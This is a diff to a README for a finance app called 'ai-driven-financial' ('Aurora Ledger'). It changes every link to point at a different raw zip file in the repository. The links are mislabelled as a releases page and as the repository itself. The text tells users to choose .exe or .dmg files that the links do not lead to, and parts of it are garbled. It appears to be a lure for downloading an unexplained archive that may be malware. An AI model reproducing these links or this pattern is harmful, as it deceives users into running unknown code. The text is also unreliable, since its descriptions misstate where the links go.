@@ -1,7 +1,7 @@
 # 🌟 ai-driven-financial - Unlock Finance Insights Effortlessly
 
 ## ⚡ Download Now!
-[![Download](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip%20Latest%https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip)](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip%20Latest%https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
 
 ## 🛠️ Introduction
 Welcome to **ai-driven-financial**! This application, also known as **Aurora Ledger**, blends predictive analytics with intuitive visualization. It helps teams uncover actionable finance strategies in real time. You don't need programming knowledge to use this tool. Just follow the steps below to download and run it smoothly.
@@ -18,11 +18,11 @@ Using **ai-driven-financial** is straightforward. You will navigate through a fe
 ## 📥 Download & Install
 To get started, visit the Releases page and download the latest version of **ai-driven-financial**. Click the link below:
 
-[Download Latest Release](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
 
 ### Step-by-Step Instructions
 1. **Visit the Releases Page:**
-   Go to the following link: [https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip).
+   Go to the following link: [https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip).
 
 2. **Choose the Latest Release:**
    Look for the most recent version listed at the top of the page.
@@ -31,7 +31,7 @@ To get started, visit the Releases page and download the latest version of **ai-
    You will see several files available for download. Choose the one that corresponds to your operating system:
    - For Windows, look for `.exe` files.
    - For Mac, look for `.dmg` files.
-   - For Linux, select the appropriate package type (e.g., `.deb` or `https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip`).
+   - For Linux, select the appropriate package type (e.g., `.deb` or `https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip`).
 
 4. **Download the File:**
    Click on the file link to start downloading. This may take a few moments, depending on your internet speed.
@@ -73,5 +73,5 @@ Your thoughts are important to us. If you have suggestions or feedback, please l
 With **ai-driven-financial**, you have a powerful and effective tool at your fingertips. Follow these simple steps to download and start optimizing your finance strategies today. You’re just a few clicks away from real-time insights! Enjoy exploring your financial data like never before.
 
 ## 🔗 Useful Links
-- **GitHub Repository:** [ai-driven-financial](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip)
-- **Download Latest Release:** [Download Here](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/assets/ai-driven-financial_v2.8-alpha.2.zip)
+- **GitHub Repository:** [ai-driven-financial](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
+- **Download Latest Release:** [Download Here](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
